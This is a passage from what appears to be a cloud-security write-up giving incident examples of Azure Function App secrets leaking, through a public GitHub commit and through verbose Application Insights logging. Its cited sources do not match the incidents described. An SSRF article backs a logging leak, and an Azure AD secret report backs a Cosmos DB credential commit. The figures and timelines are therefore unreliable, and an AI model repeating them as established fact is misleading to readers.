- **Technique Status:** Function app source code with Cosmos DB connection strings and SQL database credentials accidentally committed to public GitHub repo for 60+ days
- **Impact:** 500,000+ patient records accessible to unauthorized parties; HIPAA violation; $2M+ settlement
- **Reference:** [Resecurity: Azure AD Client Secret Leak Incident Report](https://www.resecurity.com/blog/article/azure-ad-client-secret-leak-the-keys-to-cloud)

#### Example 3: Azure Function App Secrets Logged in Application Insights

- **Target:** Financial services company using Azure Functions for payment processing
- **Timeline:** June 2024 - September 2024
- **Technique Status:** Payment API keys and database connection strings logged in Application Insights exception traces due to verbose error logging
- **Impact:** Unauthorized API calls to payment processor; fraudulent transactions; customer data exposure
- **Reference:** [Orca Security: SSRF Vulnerabilities in Azure Functions](https://orca.security/resources/blog/ssrf-vulnerabilities-azure-functions-app/)

---